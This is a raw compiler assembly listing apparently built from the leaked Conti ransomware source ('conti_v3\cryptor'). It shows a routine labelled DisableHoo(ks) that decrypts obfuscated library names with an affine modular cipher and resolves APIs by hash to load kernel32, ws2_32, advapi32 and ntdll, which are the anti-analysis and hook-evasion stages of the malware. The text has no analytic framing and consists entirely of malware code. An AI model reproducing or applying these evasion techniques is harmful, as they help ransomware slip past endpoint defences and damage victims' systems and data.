  0004b	c6 45 c3 59	 mov	 BYTE PTR $T1[rbp-173], 89 ; 00000059H
  0004f	c6 45 c4 39	 mov	 BYTE PTR $T1[rbp-172], 57 ; 00000039H
  00053	0f b6 45 b8	 movzx	 eax, BYTE PTR $T1[rbp-184]

; 58   :         return m_isDecrypted;

  00057	0f b6 45 b7	 movzx	 eax, BYTE PTR $T1[rbp-185]

; 63   :         if (!isDecrypted())

  0005b	84 c0		 test	 al, al
  0005d	75 58		 jne	 SHORT $LN44@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0005f	44 8b cb	 mov	 r9d, ebx
$LL45@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00062	42 0f b6 4c 0d
	b8		 movzx	 ecx, BYTE PTR $T1[rbp+r9-184]

; 40   :     return (a % n + n) % n;

  00068	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0006d	83 e9 39	 sub	 ecx, 57			; 00000039H
  00070	44 6b c1 33	 imul	 r8d, ecx, 51		; 00000033H

; 40   :     return (a % n + n) % n;

  00074	41 f7 e8	 imul	 r8d
  00077	41 03 d0	 add	 edx, r8d
  0007a	c1 fa 06	 sar	 edx, 6
  0007d	8b c2		 mov	 eax, edx
  0007f	c1 e8 1f	 shr	 eax, 31
  00082	03 d0		 add	 edx, eax
  00084	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00087	44 2b c0	 sub	 r8d, eax
  0008a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0008f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00093	41 f7 e8	 imul	 r8d
  00096	41 03 d0	 add	 edx, r8d
  00099	c1 fa 06	 sar	 edx, 6
  0009c	8b c2		 mov	 eax, edx
  0009e	c1 e8 1f	 shr	 eax, 31
  000a1	03 d0		 add	 edx, eax
  000a3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000a6	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000a9	46 88 44 0d b8	 mov	 BYTE PTR $T1[rbp+r9-184], r8b
  000ae	49 ff c1	 inc	 r9
  000b1	49 83 f9 0d	 cmp	 r9, 13
  000b5	72 ab		 jb	 SHORT $LL45@DisableHoo
$LN44@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  000b7	ba 0f 00 00 00	 mov	 edx, 15
  000bc	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  000c2	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  000c6	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  000cb	48 8d 4d b8	 lea	 rcx, QWORD PTR $T1[rbp-184]
  000cf	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000d1	88 5d 87	 mov	 BYTE PTR $T2[rbp-185], bl
  000d4	c6 45 88 0f	 mov	 BYTE PTR $T2[rbp-184], 15
  000d8	c6 45 89 19	 mov	 BYTE PTR $T2[rbp-183], 25
  000dc	c6 45 8a 7c	 mov	 BYTE PTR $T2[rbp-182], 124 ; 0000007cH
  000e0	c6 45 8b 4b	 mov	 BYTE PTR $T2[rbp-181], 75 ; 0000004bH
  000e4	c6 45 8c 3a	 mov	 BYTE PTR $T2[rbp-180], 58 ; 0000003aH
  000e8	c6 45 8d 7c	 mov	 BYTE PTR $T2[rbp-179], 124 ; 0000007cH
  000ec	c6 45 8e 07	 mov	 BYTE PTR $T2[rbp-178], 7
  000f0	c6 45 8f 7e	 mov	 BYTE PTR $T2[rbp-177], 126 ; 0000007eH
  000f4	c6 45 90 6a	 mov	 BYTE PTR $T2[rbp-176], 106 ; 0000006aH
  000f8	c6 45 91 6a	 mov	 BYTE PTR $T2[rbp-175], 106 ; 0000006aH
  000fc	c6 45 92 7a	 mov	 BYTE PTR $T2[rbp-174], 122 ; 0000007aH
  00100	0f b6 4d 88	 movzx	 ecx, BYTE PTR $T2[rbp-184]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  00104	48 89 45 67	 mov	 QWORD PTR hKernel32$1$[rbp-185], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 58   :         return m_isDecrypted;

  00108	0f b6 45 87	 movzx	 eax, BYTE PTR $T2[rbp-185]

; 63   :         if (!isDecrypted())

  0010c	84 c0		 test	 al, al
  0010e	75 65		 jne	 SHORT $LN82@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00110	4c 8b cb	 mov	 r9, rbx
  00113	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL83@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00120	42 0f b6 4c 0d
	88		 movzx	 ecx, BYTE PTR $T2[rbp+r9-184]

; 40   :     return (a % n + n) % n;

  00126	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0012b	83 e9 7a	 sub	 ecx, 122		; 0000007aH
  0012e	44 6b c1 19	 imul	 r8d, ecx, 25

; 40   :     return (a % n + n) % n;

  00132	41 f7 e8	 imul	 r8d
  00135	41 03 d0	 add	 edx, r8d
  00138	c1 fa 06	 sar	 edx, 6
  0013b	8b c2		 mov	 eax, edx
  0013d	c1 e8 1f	 shr	 eax, 31
  00140	03 d0		 add	 edx, eax
  00142	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00145	44 2b c0	 sub	 r8d, eax
  00148	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0014d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00151	41 f7 e8	 imul	 r8d
  00154	41 03 d0	 add	 edx, r8d
  00157	c1 fa 06	 sar	 edx, 6
  0015a	8b c2		 mov	 eax, edx
  0015c	c1 e8 1f	 shr	 eax, 31
  0015f	03 d0		 add	 edx, eax
  00161	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00164	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00167	46 88 44 0d 88	 mov	 BYTE PTR $T2[rbp+r9-184], r8b
  0016c	49 ff c1	 inc	 r9
  0016f	49 83 f9 0b	 cmp	 r9, 11
  00173	72 ab		 jb	 SHORT $LL83@DisableHoo
$LN82@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00175	ba 0f 00 00 00	 mov	 edx, 15
  0017a	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  00180	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00184	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00189	48 8d 4d 88	 lea	 rcx, QWORD PTR $T2[rbp-184]
  0018d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0018f	88 5d c7	 mov	 BYTE PTR $T3[rbp-185], bl
  00192	c6 45 c8 54	 mov	 BYTE PTR $T3[rbp-184], 84 ; 00000054H
  00196	c6 45 c9 10	 mov	 BYTE PTR $T3[rbp-183], 16
  0019a	c6 45 ca 4f	 mov	 BYTE PTR $T3[rbp-182], 79 ; 0000004fH
  0019e	c6 45 cb 45	 mov	 BYTE PTR $T3[rbp-181], 69 ; 00000045H
  001a2	c6 45 cc 3a	 mov	 BYTE PTR $T3[rbp-180], 58 ; 0000003aH
  001a6	c6 45 cd 61	 mov	 BYTE PTR $T3[rbp-179], 97 ; 00000061H
  001aa	c6 45 ce 23	 mov	 BYTE PTR $T3[rbp-178], 35 ; 00000023H
  001ae	c6 45 cf 5f	 mov	 BYTE PTR $T3[rbp-177], 95 ; 0000005fH
  001b2	c6 45 d0 51	 mov	 BYTE PTR $T3[rbp-176], 81 ; 00000051H
  001b6	c6 45 d1 10	 mov	 BYTE PTR $T3[rbp-175], 16
  001ba	c6 45 d2 2c	 mov	 BYTE PTR $T3[rbp-174], 44 ; 0000002cH
  001be	c6 45 d3 2c	 mov	 BYTE PTR $T3[rbp-173], 44 ; 0000002cH
  001c2	c6 45 d4 2f	 mov	 BYTE PTR $T3[rbp-172], 47 ; 0000002fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  001c6	48 89 45 6f	 mov	 QWORD PTR hWs2_32$1$[rbp-185], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  001ca	0f b6 45 c8	 movzx	 eax, BYTE PTR $T3[rbp-184]

; 58   :         return m_isDecrypted;

  001ce	0f b6 45 c7	 movzx	 eax, BYTE PTR $T3[rbp-185]

; 63   :         if (!isDecrypted())

  001d2	84 c0		 test	 al, al
  001d4	75 5e		 jne	 SHORT $LN124@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  001d6	4c 8b c3	 mov	 r8, rbx
  001d9	0f 1f 80 00 00
	00 00		 npad	 7
$LL125@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  001e0	42 0f b6 4c 05
	c8		 movzx	 ecx, BYTE PTR $T3[rbp+r8-184]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001e6	b8 2f 00 00 00	 mov	 eax, 47			; 0000002fH
  001eb	2b c1		 sub	 eax, ecx
  001ed	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  001f0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  001f5	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  001f8	f7 e9		 imul	 ecx
  001fa	03 d1		 add	 edx, ecx
  001fc	c1 fa 06	 sar	 edx, 6
  001ff	8b c2		 mov	 eax, edx
  00201	c1 e8 1f	 shr	 eax, 31
  00204	03 d0		 add	 edx, eax
  00206	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00209	2b c8		 sub	 ecx, eax
  0020b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00210	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00213	f7 e9		 imul	 ecx
  00215	03 d1		 add	 edx, ecx
  00217	c1 fa 06	 sar	 edx, 6
  0021a	8b c2		 mov	 eax, edx
  0021c	c1 e8 1f	 shr	 eax, 31
  0021f	03 d0		 add	 edx, eax
  00221	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00224	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00226	42 88 4c 05 c8	 mov	 BYTE PTR $T3[rbp+r8-184], cl
  0022b	49 ff c0	 inc	 r8
  0022e	49 83 f8 0d	 cmp	 r8, 13
  00232	72 ac		 jb	 SHORT $LL125@DisableHoo
$LN124@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00234	ba 0f 00 00 00	 mov	 edx, 15
  00239	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  0023f	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00243	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00248	48 8d 4d c8	 lea	 rcx, QWORD PTR $T3[rbp-184]
  0024c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0024e	88 5c 24 20	 mov	 BYTE PTR $T4[rsp], bl
  00252	c6 44 24 21 0b	 mov	 BYTE PTR $T4[rsp+1], 11
  00257	c6 44 24 22 25	 mov	 BYTE PTR $T4[rsp+2], 37	; 00000025H
  0025c	c6 44 24 23 0a	 mov	 BYTE PTR $T4[rsp+3], 10
  00261	c6 44 24 24 57	 mov	 BYTE PTR $T4[rsp+4], 87	; 00000057H
  00266	c6 44 24 25 57	 mov	 BYTE PTR $T4[rsp+5], 87	; 00000057H
  0026b	c6 44 24 26 1e	 mov	 BYTE PTR $T4[rsp+6], 30
  00270	c6 44 24 27 0a	 mov	 BYTE PTR $T4[rsp+7], 10
  00275	c6 44 24 28 57	 mov	 BYTE PTR $T4[rsp+8], 87	; 00000057H
  0027a	c6 44 24 29 57	 mov	 BYTE PTR $T4[rsp+9], 87	; 00000057H
  0027f	88 5c 24 2a	 mov	 BYTE PTR $T4[rsp+10], bl
  00283	0f b6 4c 24 21	 movzx	 ecx, BYTE PTR $T4[rsp+1]

; 58   :         return m_isDecrypted;

  00288	0f b6 4c 24 20	 movzx	 ecx, BYTE PTR $T4[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  0028d	48 89 45 77	 mov	 QWORD PTR hAdvapi32$1$[rbp-185], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 63   :         if (!isDecrypted())

  00291	84 c9		 test	 cl, cl
  00293	75 5f		 jne	 SHORT $LN160@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00295	4c 8b cb	 mov	 r9, rbx
  00298	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL161@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002a0	42 0f b6 44 0c
	21		 movzx	 eax, BYTE PTR $T4[rsp+r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002a6	44 8d 04 80	 lea	 r8d, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  002aa	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002af	45 03 c0	 add	 r8d, r8d

; 40   :     return (a % n + n) % n;

  002b2	41 f7 e0	 mul	 r8d
  002b5	41 8b c0	 mov	 eax, r8d
  002b8	2b c2		 sub	 eax, edx
  002ba	d1 e8		 shr	 eax, 1
  002bc	03 c2		 add	 eax, edx
  002be	c1 e8 06	 shr	 eax, 6
  002c1	6b c0 7f	 imul	 eax, eax, 127		; 0000007fH
  002c4	44 2b c0	 sub	 r8d, eax
  002c7	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  002cc	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  002d0	41 f7 e8	 imul	 r8d
  002d3	41 03 d0	 add	 edx, r8d
  002d6	c1 fa 06	 sar	 edx, 6
  002d9	8b c2		 mov	 eax, edx
  002db	c1 e8 1f	 shr	 eax, 31
  002de	03 d0		 add	 edx, eax
  002e0	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002e3	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002e6	46 88 44 0c 21	 mov	 BYTE PTR $T4[rsp+r9+1], r8b
  002eb	49 ff c1	 inc	 r9
  002ee	49 83 f9 0a	 cmp	 r9, 10
  002f2	72 ac		 jb	 SHORT $LL161@DisableHoo
$LN160@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  002f4	ba 0f 00 00 00	 mov	 edx, 15
  002f9	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  002ff	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00303	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00308	48 8d 4c 24 21	 lea	 rcx, QWORD PTR $T4[rsp+1]
  0030d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0030f	88 5d d7	 mov	 BYTE PTR $T5[rbp-185], bl
  00312	c6 45 d8 43	 mov	 BYTE PTR $T5[rbp-184], 67 ; 00000043H
  00316	c6 45 d9 5e	 mov	 BYTE PTR $T5[rbp-183], 94 ; 0000005eH
  0031a	c6 45 da 0e	 mov	 BYTE PTR $T5[rbp-182], 14
  0031e	c6 45 db 2f	 mov	 BYTE PTR $T5[rbp-181], 47 ; 0000002fH
  00322	c6 45 dc 0e	 mov	 BYTE PTR $T5[rbp-180], 14
  00326	c6 45 dd 42	 mov	 BYTE PTR $T5[rbp-179], 66 ; 00000042H
  0032a	c6 45 de 26	 mov	 BYTE PTR $T5[rbp-178], 38 ; 00000026H
  0032e	c6 45 df 2f	 mov	 BYTE PTR $T5[rbp-177], 47 ; 0000002fH
  00332	c6 45 e0 1a	 mov	 BYTE PTR $T5[rbp-176], 26
  00336	c6 45 e1 18	 mov	 BYTE PTR $T5[rbp-175], 24
  0033a	c6 45 e2 13	 mov	 BYTE PTR $T5[rbp-174], 19
  0033e	c6 45 e3 13	 mov	 BYTE PTR $T5[rbp-173], 19
  00342	c6 45 e4 17	 mov	 BYTE PTR $T5[rbp-172], 23
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  00346	48 89 45 7f	 mov	 QWORD PTR hNtdll$1$[rbp-185], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0034a	0f b6 45 d8	 movzx	 eax, BYTE PTR $T5[rbp-184]

; 58   :         return m_isDecrypted;

  0034e	0f b6 45 d7	 movzx	 eax, BYTE PTR $T5[rbp-185]

; 63   :         if (!isDecrypted())

  00352	84 c0		 test	 al, al
  00354	75 5b		 jne	 SHORT $LN202@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00356	4c 8b c3	 mov	 r8, rbx
  00359	0f 1f 80 00 00
	00 00		 npad	 7
$LL203@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00360	42 0f b6 4c 05
	d8		 movzx	 ecx, BYTE PTR $T5[rbp+r8-184]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00366	b8 17 00 00 00	 mov	 eax, 23
  0036b	2b c1		 sub	 eax, ecx
  0036d	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  00370	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00375	f7 e9		 imul	 ecx
  00377	03 d1		 add	 edx, ecx
  00379	c1 fa 06	 sar	 edx, 6
  0037c	8b c2		 mov	 eax, edx
  0037e	c1 e8 1f	 shr	 eax, 31
  00381	03 d0		 add	 edx, eax
  00383	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00386	2b c8		 sub	 ecx, eax
  00388	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0038d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00390	f7 e9		 imul	 ecx
  00392	03 d1		 add	 edx, ecx
  00394	c1 fa 06	 sar	 edx, 6
  00397	8b c2		 mov	 eax, edx
  00399	c1 e8 1f	 shr	 eax, 31
  0039c	03 d0		 add	 edx, eax
  0039e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003a1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003a3	42 88 4c 05 d8	 mov	 BYTE PTR $T5[rbp+r8-184], cl
  003a8	49 ff c0	 inc	 r8
  003ab	49 83 f8 0d	 cmp	 r8, 13
  003af	72 af		 jb	 SHORT $LL203@DisableHoo
$LN202@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  003b1	ba 0f 00 00 00	 mov	 edx, 15
  003b6	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  003bc	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  003c0	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  003c5	48 8d 4d d8	 lea	 rcx, QWORD PTR $T5[rbp-184]
  003c9	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  003cb	88 5c 24 30	 mov	 BYTE PTR $T6[rsp], bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  003cf	4c 8b e8	 mov	 r13, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  003d2	c6 44 24 31 25	 mov	 BYTE PTR $T6[rsp+1], 37	; 00000025H
  003d7	c6 44 24 32 74	 mov	 BYTE PTR $T6[rsp+2], 116 ; 00000074H
  003dc	c6 44 24 33 28	 mov	 BYTE PTR $T6[rsp+3], 40	; 00000028H
  003e1	c6 44 24 34 72	 mov	 BYTE PTR $T6[rsp+4], 114 ; 00000072H
  003e6	c6 44 24 35 55	 mov	 BYTE PTR $T6[rsp+5], 85	; 00000055H
  003eb	c6 44 24 36 60	 mov	 BYTE PTR $T6[rsp+6], 96	; 00000060H
  003f0	c6 44 24 37 0b	 mov	 BYTE PTR $T6[rsp+7], 11
  003f5	c6 44 24 38 74	 mov	 BYTE PTR $T6[rsp+8], 116 ; 00000074H
  003fa	c6 45 80 74	 mov	 BYTE PTR $T6[rbp-176], 116 ; 00000074H
  003fe	c6 45 81 20	 mov	 BYTE PTR $T6[rbp-175], 32 ; 00000020H
  00402	0f b6 4c 24 31	 movzx	 ecx, BYTE PTR $T6[rsp+1]

; 58   :         return m_isDecrypted;

  00407	0f b6 4c 24 30	 movzx	 ecx, BYTE PTR $T6[rsp]

; 63   :         if (!isDecrypted())

  0040c	84 c9		 test	 cl, cl
  0040e	75 61		 jne	 SHORT $LN238@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00410	4c 8b c3	 mov	 r8, rbx
  00413	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL239@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00420	42 0f b6 4c 04
	31		 movzx	 ecx, BYTE PTR $T6[rsp+r8+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00426	b8 20 00 00 00	 mov	 eax, 32			; 00000020H
  0042b	2b c1		 sub	 eax, ecx
  0042d	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00430	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00435	f7 e9		 imul	 ecx
  00437	03 d1		 add	 edx, ecx
  00439	c1 fa 06	 sar	 edx, 6
  0043c	8b c2		 mov	 eax, edx
  0043e	c1 e8 1f	 shr	 eax, 31
  00441	03 d0		 add	 edx, eax
  00443	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00446	2b c8		 sub	 ecx, eax
  00448	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0044d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00450	f7 e9		 imul	 ecx
  00452	03 d1		 add	 edx, ecx
  00454	c1 fa 06	 sar	 edx, 6
  00457	8b c2		 mov	 eax, edx
  00459	c1 e8 1f	 shr	 eax, 31
  0045c	03 d0		 add	 edx, eax
  0045e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00461	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00463	42 88 4c 04 31	 mov	 BYTE PTR $T6[rsp+r8+1], cl
  00468	49 ff c0	 inc	 r8
  0046b	49 83 f8 0a	 cmp	 r8, 10
  0046f	72 af		 jb	 SHORT $LL239@DisableHoo
$LN238@DisableHoo:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1265 : 	pFunction = (HMODULE(WINAPI*)(LPCSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x439c7e33, 4);

  00471	ba 0f 00 00 00	 mov	 edx, 15
  00476	41 b8 33 7e 9c
	43		 mov	 r8d, 1134329395		; 439c7e33H
  0047c	44 8d 4a f5	 lea	 r9d, QWORD PTR [rdx-11]
  00480	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1266 : 	return pFunction(lpLibFileName);

  00485	48 8d 4c 24 31	 lea	 rcx, QWORD PTR $T6[rsp+1]
  0048a	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0048c	88 5d e7	 mov	 BYTE PTR $T7[rbp-185], bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1266 : 	return pFunction(lpLibFileName);

  0048f	4c 8b f8	 mov	 r15, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00492	c6 45 e8 79	 mov	 BYTE PTR $T7[rbp-184], 121 ; 00000079H
  00496	c6 45 e9 4f	 mov	 BYTE PTR $T7[rbp-183], 79 ; 0000004fH
  0049a	c6 45 ea 4c	 mov	 BYTE PTR $T7[rbp-182], 76 ; 0000004cH
  0049e	c6 45 eb 73	 mov	 BYTE PTR $T7[rbp-181], 115 ; 00000073H
  004a2	c6 45 ec 65	 mov	 BYTE PTR $T7[rbp-180], 101 ; 00000065H
  004a6	c6 45 ed 1c	 mov	 BYTE PTR $T7[rbp-179], 28
  004aa	c6 45 ee 6d	 mov	 BYTE PTR $T7[rbp-178], 109 ; 0000006dH
  004ae	c6 45 ef 24	 mov	 BYTE PTR $T7[rbp-177], 36 ; 00000024H
  004b2	c6 45 f0 7d	 mov	 BYTE PTR $T7[rbp-176], 125 ; 0000007dH
  004b6	c6 45 f1 03	 mov	 BYTE PTR $T7[rbp-175], 3
  004ba	c6 45 f2 4f	 mov	 BYTE PTR $T7[rbp-174], 79 ; 0000004fH
  004be	c6 45 f3 4f	 mov	 BYTE PTR $T7[rbp-173], 79 ; 0000004fH
  004c2	c6 45 f4 45	 mov	 BYTE PTR $T7[rbp-172], 69 ; 00000045H
  004c6	0f b6 45 e8	 movzx	 eax, BYTE PTR $T7[rbp-184]

; 58   :         return m_isDecrypted;

  004ca	0f b6 45 e7	 movzx	 eax, BYTE PTR $T7[rbp-185]

; 63   :         if (!isDecrypted())

  004ce	84 c0		 test	 al, al
  004d0	75 62		 jne	 SHORT $LN280@DisableHoo

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  004d2	4c 8b c3	 mov	 r8, rbx
  004d5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL281@DisableHoo:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  004e0	42 0f b6 4c 05
	e8		 movzx	 ecx, BYTE PTR $T7[rbp+r8-184]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  004e6	b8 45 00 00 00	 mov	 eax, 69			; 00000045H
  004eb	2b c1		 sub	 eax, ecx
  004ed	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  004f0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  004f5	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  004f8	f7 e9		 imul	 ecx
  004fa	03 d1		 add	 edx, ecx
  004fc	c1 fa 06	 sar	 edx, 6
  004ff	8b c2		 mov	 eax, edx
  00501	c1 e8 1f	 shr	 eax, 31
